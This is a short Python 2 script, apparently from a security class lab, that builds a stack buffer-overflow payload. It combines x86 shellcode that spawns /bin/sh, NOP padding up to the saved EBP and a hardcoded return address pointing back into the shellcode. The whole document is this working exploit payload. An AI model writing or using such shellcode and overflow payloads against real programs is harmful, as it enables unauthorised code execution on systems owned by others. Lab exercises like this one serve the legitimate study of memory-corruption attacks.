#The following code is inspired from the exploit provided in class lab hours
from struct import pack

p = ''

# Following code is to get a shell
exploit = "\x31\xc0\x50\x68""//sh\x68""/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

# total bytes from Buffer adress to EBP
total =24

nop_len = total - len(exploit);

# Fill extra space with NOPs
junk = ((nop_len) * "\x90")

# Over writing the buffer with shell code+NOP(till we get to EBP)+return address (pointing to shell code)
p +=  exploit + junk +  pack("<I", 0xffffcf47)

print p
